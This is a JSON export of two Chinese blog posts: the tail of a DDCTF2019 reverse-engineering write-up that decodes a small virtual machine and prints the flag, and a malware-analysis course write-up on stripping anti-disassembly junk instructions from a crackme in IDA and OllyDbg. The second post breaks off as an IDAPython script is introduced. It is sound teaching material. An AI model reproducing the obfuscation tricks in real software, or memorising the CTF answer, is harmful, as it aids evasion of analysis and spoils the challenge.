= sub_100001CB0;</span><br><span class=\"line\">  *(_BYTE *)(result + <span class=\"number\">96</span>) = <span class=\"number\">-11</span>;</span><br><span class=\"line\">  *(_QWORD *)(result + <span class=\"number\">104</span>) = sub_100001CF0;</span><br><span class=\"line\">  *(_BYTE *)(result + <span class=\"number\">112</span>) = <span class=\"number\">-13</span>;</span><br><span class=\"line\">  *(_QWORD *)(result + <span class=\"number\">120</span>) = sub_100001B70;</span><br><span class=\"line\">  *(_BYTE *)(result + <span class=\"number\">128</span>) = <span class=\"number\">-10</span>;</span><br><span class=\"line\">  *(_QWORD *)(result + <span class=\"number\">136</span>) = sub_100001B10;</span><br><span class=\"line\">  *(_BYTE *)(result + <span class=\"number\">144</span>) = <span class=\"number\">-9</span>;</span><br><span class=\"line\">  *(_QWORD *)(result + <span class=\"number\">152</span>) = sub_100001D30;</span><br><span class=\"line\">  *(_BYTE *)(result + <span class=\"number\">160</span>) = <span class=\"number\">-8</span>;</span><br><span class=\"line\">  *(_QWORD *)(result + <span class=\"number\">168</span>) = sub_100001C60;</span><br><span class=\"line\">  qword_100003F58 = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x400</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __memcpy_chk((<span class=\"keyword\">char</span> *)qword_100003F58 + <span class=\"number\">48</span>, a2, <span class=\"number\">18L</span>L, <span class=\"number\">-1L</span>L);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>由上述，逆向得到结构体中的关键变量如下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span></span><br><span class=\"line\">  DWORD num0; <span class=\"comment\">// + 0</span></span><br><span class=\"line\">  DWORD num4; <span class=\"comment\">// + 4</span></span><br><span class=\"line\">  DWORD num8; <span class=\"comment\">// + 8</span></span><br><span class=\"line\">  DWORD num12; <span class=\"comment\">// + 12</span></span><br><span class=\"line\">  DWORD flag; <span class=\"comment\">// + 16</span></span><br><span class=\"line\">  DWORD result; <span class=\"comment\">// + 176</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>结构体中其他字段为常数和常量函数指针，后续算法中这些常数和函数指针是一一对应的。常数分别为：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">array = [<span class=\"number\">0xf0</span>, <span class=\"number\">0xf1</span>, <span class=\"number\">0xf2</span>, <span class=\"number\">0xf4</span>, <span class=\"number\">0xf5</span>, <span class=\"number\">0xf3</span>, <span class=\"number\">0xf6</span>, <span class=\"number\">0xf7</span>, <span class=\"number\">0xf8</span>]</span><br></pre></td></tr></table></figure>\n<p>最后在0x100001f00中，首先令结构体的0x24偏移处指向一块内存区域，然后循环调用sub_100001e50。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __<span class=\"function\">fastcall <span class=\"title\">sub_100001F00</span><span class=\"params\">(__int64 myclass)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  *(_QWORD *)(myclass + <span class=\"number\">24</span>) = (<span class=\"keyword\">char</span> *)&amp;loc_100001980 + <span class=\"number\">4</span>;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( **(<span class=\"keyword\">unsigned</span> __int8 **)(myclass + <span class=\"number\">24</span>) != <span class=\"number\">243</span> )</span><br><span class=\"line\">    sub_100001E50(myclass);</span><br><span class=\"line\">  <span class=\"built_in\">free</span>(qword_100003F58);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> *(<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> *)(myclass + <span class=\"number\">176</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>sub_100001e50的f5代码如下：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">bool</span> __<span class=\"function\">fastcall <span class=\"title\">sub_100001E50</span><span class=\"params\">(__int64 myclass)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">bool</span> result; <span class=\"comment\">// al</span></span><br><span class=\"line\">  <span class=\"keyword\">bool</span> v2; <span class=\"comment\">// [rsp+Fh] [rbp-11h]</span></span><br><span class=\"line\">  <span class=\"keyword\">signed</span> <span class=\"keyword\">int</span> v3; <span class=\"comment\">// [rsp+10h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"keyword\">signed</span> <span class=\"keyword\">int</span> v4; <span class=\"comment\">// [rsp+14h] [rbp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v4 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v3 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v2 = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !v4 )</span><br><span class=\"line\">      v2 = v3 &lt; <span class=\"number\">9</span>;</span><br><span class=\"line\">    result = v2;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !v2 )</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( **(<span class=\"keyword\">unsigned</span> __int8 **)(myclass + <span class=\"number\">24</span>) == *(<span class=\"keyword\">unsigned</span> __int8 *)(<span class=\"number\">16L</span>L * v3 + myclass + <span class=\"number\">32</span>) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v4 = <span class=\"number\">1</span>;</span><br><span class=\"line\">      (*(<span class=\"keyword\">void</span> (__fastcall **)(__int64))(<span class=\"number\">16L</span>L * v3 + myclass + <span class=\"number\">32</span> + <span class=\"number\">8</span>))(myclass);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      ++v3;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>如果那块内存区域中当前指针指向的位置的标志与相应的常数相同，就执行相应的函数指针的所指向的函数操作。</p>\n<p>最后是需要result字段为1，而result字段为1需要调用sub_10001d30函数。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __<span class=\"function\">fastcall <span class=\"title\">sub_100001D30</span><span class=\"params\">(__int64 a1)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  __int64 result; <span class=\"comment\">// rax</span></span><br><span class=\"line\"></span><br><span class=\"line\">  result = *(<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> *)(*(_QWORD *)(a1 + <span class=\"number\">24</span>) + <span class=\"number\">1L</span>L);</span><br><span class=\"line\">  *(_DWORD *)(a1 + <span class=\"number\">176</span>) = result;</span><br><span class=\"line\">  *(_QWORD *)(a1 + <span class=\"number\">24</span>) += <span class=\"number\">5L</span>L;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>看起来似乎十分复杂，但我们仔细观察一下那块内存区域。</p>\n<p>可以看到\\xf0, \\xf8, \\xf2, \\xf6这些标志位重复的出现，而在0xc6和0xcc偏移处出两次出现\\xf7，由上述sub_10001d30函数的F5代码看出，在若结构体中的指针指向0xc6处，将会把结构体中的result字段设置为1（因为紧接着\\xf7的一个byte为\\x01）。这时我们悟到，程序中会多次执行\\xf0, \\xf8, \\xf2, \\xf6对应的函数指针的函数操作，直到结构体中0x24处的指针走到0xc6偏移处。此时我们只需要对这四个函数进行逆向即可，下面给出这4个函数算法的Python实现。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">func0</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> magic[index + <span class=\"number\">1</span>] == <span class=\"number\">0x10</span>:</span><br><span class=\"line\">\t\tnum0 = magic[index + <span class=\"number\">2</span>]</span><br><span class=\"line\">\t<span class=\"keyword\">elif</span> magic[index + <span class=\"number\">1</span>] == <span class=\"number\">0x11</span>:</span><br><span class=\"line\">\t\tnum4 = magic[index + <span class=\"number\">2</span>]</span><br><span class=\"line\">\t<span class=\"keyword\">elif</span> magic[index + <span class=\"number\">1</span>] == <span class=\"number\">0x12</span>:</span><br><span class=\"line\">\t\tnum8 = magic[index + <span class=\"number\">2</span>]</span><br><span class=\"line\">\t<span class=\"keyword\">elif</span> magic[index + <span class=\"number\">1</span>] == <span class=\"number\">0x13</span>:</span><br><span class=\"line\">\t\tnum12 = magic[index + <span class=\"number\">2</span>]</span><br><span class=\"line\">\t<span class=\"keyword\">elif</span> magic[index + <span class=\"number\">1</span>] == <span class=\"number\">0x14</span>:</span><br><span class=\"line\">\t\tnum0 = input_str[cur]</span><br><span class=\"line\">\tindex += <span class=\"number\">6</span></span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">func2</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> num0 == input_str[cur]:\t</span><br><span class=\"line\">\t\tflag = <span class=\"number\">1</span></span><br><span class=\"line\">\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\tflag = <span class=\"number\">0</span></span><br><span class=\"line\">\tindex += <span class=\"number\">2</span></span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">func6</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> flag == <span class=\"number\">1</span>:</span><br><span class=\"line\">\t\tflag = <span class=\"number\">0</span></span><br><span class=\"line\">\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\tindex += magic[index + <span class=\"number\">1</span>]</span><br><span class=\"line\">\tindex += <span class=\"number\">2</span></span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">func8</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> num0 &gt;= <span class=\"number\">0x41</span> <span class=\"keyword\">and</span> num0 &lt;= <span class=\"number\">0x5a</span>:</span><br><span class=\"line\">\t\tv5 = (<span class=\"number\">2</span> + num0 - <span class=\"number\">65</span>) % <span class=\"number\">26</span> + <span class=\"number\">65</span></span><br><span class=\"line\">\t<span class=\"keyword\">elif</span> num0 &gt;= <span class=\"number\">0x61</span> <span class=\"keyword\">and</span> num0 &lt;= <span class=\"number\">0x7a</span>:</span><br><span class=\"line\">\t\tv5 = (<span class=\"number\">2</span> + num0 - <span class=\"number\">97</span>) % <span class=\"number\">26</span> + <span class=\"number\">97</span></span><br><span class=\"line\">\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\tv5 = num0</span><br><span class=\"line\">\tnum0 = v5</span><br><span class=\"line\">\tindex += <span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>​    实际上，magic bytes中每个\\xf0后面跟的都是0x10，所以我们将每个\\xf0后跟的第二个字节根据func8的逻辑进行变换，即可得到最后的flag。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag = <span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i, mark <span class=\"keyword\">in</span> enumerate(magic):</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> ord(mark) == <span class=\"number\">0xf0</span> <span class=\"keyword\">and</span> ord(magic[i+<span class=\"number\">1</span>]) == <span class=\"number\">0x10</span>:</span><br><span class=\"line\">\t\tnum = ord(magic[i+<span class=\"number\">2</span>])</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> num &gt;= <span class=\"number\">0x41</span> <span class=\"keyword\">and</span> num &lt;= <span class=\"number\">0x5a</span>:</span><br><span class=\"line\">\t\t\tnum = (<span class=\"number\">2</span> + num - <span class=\"number\">65</span>) % <span class=\"number\">26</span> + <span class=\"number\">65</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">elif</span> num &gt;= <span class=\"number\">0x61</span> <span class=\"keyword\">and</span> num &lt;= <span class=\"number\">0x7a</span>:</span><br><span class=\"line\">\t\t\tnum = (<span class=\"number\">2</span> + num - <span class=\"number\">97</span>) % <span class=\"number\">26</span> + <span class=\"number\">97</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\tnum = num</span><br><span class=\"line\">\t\tflag += chr(num)</span><br><span class=\"line\"><span class=\"keyword\">print</span> flag</span><br></pre></td></tr></table></figure>\n<p>flag如下：<br>DDCTF{helloYouGotTheFlag}</p>\n","text":"本次DDCTF2019抱着玩一玩的心态参与了一下，事先不知道Pwn的题目这么少，RE的题目也不算多（主要RE的难题我不会做，简单题又比较水），所以就一开始做了两天，后续没有再尝试，最后排名100多位。下面简单总结一下Pwn和RE几道题的writeup。Pwnpwn只有一道题目St","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"pwn","slug":"pwn","count":7,"path":"api/tags/pwn.json"},{"name":"RE","slug":"RE","count":2,"path":"api/tags/RE.json"}]},{"title":"花指令去除wp","slug":"花指令去除wp","date":"2018-12-05T13:50:11.000Z","updated":"2018-12-06T06:48:32.000Z","comments":true,"path":"api/articles/花指令去除wp.json","excerpt":"","keywords":null,"cover":null,"content":"<p>​    这学期《恶意代码分析》这门课的作业留了一道RE题，其中包含大量批量插入的花指令。在这里简单记录一下分析过程。</p>\n<h2 id=\"0x00-基本分析\"><a href=\"#0x00-基本分析\" class=\"headerlink\" title=\"0x00  基本分析\"></a>0x00  基本分析</h2><p>首先动态执行程序看一下</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">D:\\UCAS\\malware_analyse&gt;Anti.exe</span><br><span class=\"line\">The encypted flag in hex is:</span><br><span class=\"line\">3A3B3138233B3C3437300B3730073228393523062E2B242A</span><br><span class=\"line\">Please input cipher character:3</span><br><span class=\"line\">Hex result for encrypt string 'thisisasimplesamplestring' is:</span><br><span class=\"line\">7A6D6B7E63756C706D61766661796B62756067787271656B6B</span><br></pre></td></tr></table></figure>\n<p>输入点只有一个，要求输入一个加密字符，然后就会输出对<code>thisisasimplesamplestring</code>字符串的加密结果。那么显然，只要我们能够分析并逆向出加密算法，就能把加密后的flag解密得到原flag，当然这个加密算法应该是可逆的，否则就有点难办了。</p>\n<p>首先用IDA加载Anti.exe，并加载题目所给的pdb文件——应该说出题人还是很好的（谢谢师兄~_~）。之后粗略浏览反汇编代码，主要有两点发现：</p>\n<ul>\n<li>该程序应该由C++语言编写，因为有虚表和类层次关系</li>\n<li>代码中添加了大量花指令</li>\n</ul>\n<h2 id=\"0x01-花指令分析\"><a href=\"#0x01-花指令分析\" class=\"headerlink\" title=\"0x01  花指令分析\"></a>0x01  花指令分析</h2><p>下面对代码中涉及到的花指令作基本分析</p>\n<p>1.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:00401A1B loc_401A1B:                             ; CODE XREF: .text:loc_401A1B↑j</span><br><span class=\"line\">.text:00401A1B                 jmp     short near ptr loc_401A1B+1</span><br><span class=\"line\">.text:00401A1D ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.text:00401A1D                 ror     byte ptr [eax-73h], 45h</span><br></pre></td></tr></table></figure>\n<p>这是因为两条顺序执行的指令使用了一个公共byte，而IDA在反汇编完一条指令后，会从这条指令的下一个地址处开始反汇编，所以无法表示这种情况。具体来说，0x401a1b处是<code>0xeb</code>,0x401a1c处是<code>0xff</code>，IDA首先把0xeb翻译成jmp指令，然后往下找操作数，是短跳转+1；之后，就会顺序反汇编0x401a1d处的内容。但是程序在执行时实际上跳转到0x1a1c处执行，这就导致一个矛盾。</p>\n<p>手工去掉花指令还原即可，暂时不用管那个垃圾字节，在脚本批量去除阶段可以Patch为NOP指令。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:00401A14 ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.text:00401A1B                 db 0EBh</span><br><span class=\"line\">.text:00401A1C ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.text:00401A1C                 inc     eax</span><br><span class=\"line\">.text:00401A1E                 dec     eax</span><br><span class=\"line\">.text:00401A1F                 lea     eax, [ebp-34h]</span><br></pre></td></tr></table></figure>\n<p>2.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:004019E5                 push    offset __ehhandler$?enc2@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V12@D@Z</span><br><span class=\"line\">.text:004019EA                 mov     eax, large fs:0</span><br><span class=\"line\">.text:004019F0                 push    eax</span><br><span class=\"line\">.text:004019F1                 mov     large fs:0, esp</span><br><span class=\"line\">......</span><br><span class=\"line\">.text:00401A4E                 xor     eax, eax</span><br><span class=\"line\">.text:00401A50                 idiv    eax</span><br><span class=\"line\">.text:00401A52                 retn</span><br><span class=\"line\">.text:00401A53                 db 8Bh</span><br><span class=\"line\">.text:00401A54                 dd 64082464h, 0A1h, 8B008B00h, 0A36400h, 83000000h, 5D5808C4h</span><br><span class=\"line\">......</span><br></pre></td></tr></table></figure>\n<p>这算是第二种花指令。0x4019e5处的四条指令首先将fs[0]压入堆栈，从而使得执行完成后，fs[0]指向栈顶。之后，构造一个err结构。在0x401a4e处，故意触发一个除零异常，然后就会进入异常处理流程。</p>\n<p>同时，由于除零后是一条retn指令，IDA在反汇编时不会将retn的下一个地址识别为指令，直到找到一个函数头<code>push    ebp; mov    ebp, esp</code> ，这又使得反汇编出错。</p>\n<p>详细的异常处理流程我们在静态分析阶段不好分析，如读者感兴趣可以详细查阅资料。但我们通过OD调试可以大体了解程序的控制流。</p>\n<p>在0x401a50处下断，并在调试选项中去掉所有忽略异常的勾选，点击确定后F9断到断点处，然后F8单步调试，到达如下位置</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">7C92E460    8B1C24          mov ebx,dword ptr ss:[esp]</span><br><span class=\"line\">7C92E463    51              push ecx</span><br><span class=\"line\">7C92E464    53              push ebx</span><br><span class=\"line\">7C92E465    E8 E6C40100     call ntdll.7C94A950</span><br></pre></td></tr></table></figure>\n<p>F7步入函数调用，然后继续单步跟，看到一个可疑位置，会将0x401a53的地址作为参数压栈，然后调用一个函数，步入函数。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">7C923261    FF7424 20       push dword ptr ss:[esp+0x20]             ; Anti.00401A53</span><br><span class=\"line\">7C923265    FF7424 20       push dword ptr ss:[esp+0x20]             ; Anti.00401A53</span><br><span class=\"line\">7C923269    FF7424 20       push dword ptr ss:[esp+0x20]             ; Anti.00401A53</span><br><span class=\"line\">7C92326D    FF7424 20       push dword ptr ss:[esp+0x20]             ; Anti.00401A53</span><br><span class=\"line\">7C923271    FF7424 20       push dword ptr ss:[esp+0x20]             ; Anti.00401A53</span><br><span class=\"line\">7C923275    E8 08000000     call ntdll.7C923282</span><br></pre></td></tr></table></figure>\n<p>果然，此处最终<code>call ecx</code>，使得eip跳转到0x401a53处执行。所以我们应该在0x401a53处按C识别为代码，修复反汇编。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">7C923289    64:FF35 0000000&gt;push dword ptr fs:[0]</span><br><span class=\"line\">7C923290    64:8925 0000000&gt;mov dword ptr fs:[0],esp</span><br><span class=\"line\">7C923297    FF75 14         push dword ptr ss:[ebp+0x14]</span><br><span class=\"line\">7C92329A    FF75 10         push dword ptr ss:[ebp+0x10]</span><br><span class=\"line\">7C92329D    FF75 0C         push dword ptr ss:[ebp+0xC]</span><br><span class=\"line\">7C9232A0    FF75 08         push dword ptr ss:[ebp+0x8]</span><br><span class=\"line\">7C9232A3    8B4D 18         mov ecx,dword ptr ss:[ebp+0x18]          ; Anti.00401A53</span><br><span class=\"line\">7C9232A6    FFD1            call ecx                                 ; Anti.00401A53</span><br></pre></td></tr></table></figure>\n<p>3.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:00401A8A                 jz      near ptr loc_401A96+4</span><br><span class=\"line\">.text:00401A90                 jnz     near ptr loc_401A96+4</span><br><span class=\"line\">.text:00401A96</span><br><span class=\"line\">.text:00401A96 loc_401A96:                             ; CODE XREF: .text:00401A8A↑j</span><br><span class=\"line\">.text:00401A96                                         ; .text:00401A90↑j</span><br><span class=\"line\">.text:00401A96                 call    near ptr 0F733CACh</span><br></pre></td></tr></table></figure>\n<p>比起上面两种花指令，这一种都算小菜啦。构造连续两个互补的条件跳转到同一位置。因为条件跳转为基本块出口，诱导IDA反汇编基本块邻接地址为新的基本块入口。实际上只是几个字节的垃圾数据。简单修复即可。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:00401A8A                 jz      loc_401A9A</span><br><span class=\"line\">.text:00401A90                 jnz     loc_401A9A</span><br><span class=\"line\">.text:00401A90 ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.text:00401A96                 db 0E8h</span><br><span class=\"line\">.text:00401A97                 db  11h</span><br><span class=\"line\">.text:00401A98                 db  22h ; &quot;</span><br><span class=\"line\">.text:00401A99                 db  33h ; 3</span><br><span class=\"line\">.text:00401A9A ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.text:00401A9A</span><br><span class=\"line\">.text:00401A9A loc_401A9A:                             ; CODE XREF: .text:00401A8A↑j</span><br><span class=\"line\">.text:00401A9A                                         ; .text:00401A90↑j</span><br></pre></td></tr></table></figure>\n<p>4.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:00401ACA                 xor     eax, eax</span><br><span class=\"line\">.text:00401ACC                 jz      near ptr loc_401AD2+1</span><br><span class=\"line\">.text:00401AD2</span><br><span class=\"line\">.text:00401AD2 loc_401AD2:                             ; CODE XREF: .text:00401ACC↑j</span><br><span class=\"line\">.text:00401AD2                 call    near ptr 0D085A62Fh</span><br></pre></td></tr></table></figure>\n<p>这种是构造一个恒真的条件跳转，再加上一个垃圾字节，很好理解。简单修复即可。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:00401ACA                 xor     eax, eax</span><br><span class=\"line\">.text:00401ACC                 jz      loc_401AD3</span><br><span class=\"line\">.text:00401ACC ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.text:00401AD2                 db 0E8h</span><br><span class=\"line\">.text:00401AD3 ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.text:00401AD3</span><br><span class=\"line\">.text:00401AD3 loc_401AD3:                             ; CODE XREF: .text:00401ACC↑j</span><br><span class=\"line\">.text:00401AD3                 pop     eax</span><br><span class=\"line\">.text:00401AD4                 mov     eax, [ebp-30h]</span><br></pre></td></tr></table></figure>\n<p>分析到这里，第一个函数enc1的花指令我们已经完全去除了，在IDA中按F5可以进行反编译。不过在手动分析下一个函数后，按F5无法进行反编译。这是因为IDA没有将其识别为函数，我们在已修复的函数入口点处按P MakeProc即可。</p>\n<h2 id=\"0x02-脚本批量去除花指令\"><a href=\"#0x02-脚本批量去除花指令\" class=\"headerlink\" title=\"0x02 脚本批量去除花指令\"></a>0x02 脚本批量去除花指令</h2><p>到这里相信手工去除花指令已经难不倒大家了，但是程序中显然有大量批量插入的花指令，如果一一通过手工去除，不太可行。这时候，我们可以借助IDAPython这个工具编写一个去除花指令的插件。<a href=\"https://www.hex-rays.com/products/ida/support/idapython_docs/\" target=\"_blank\" 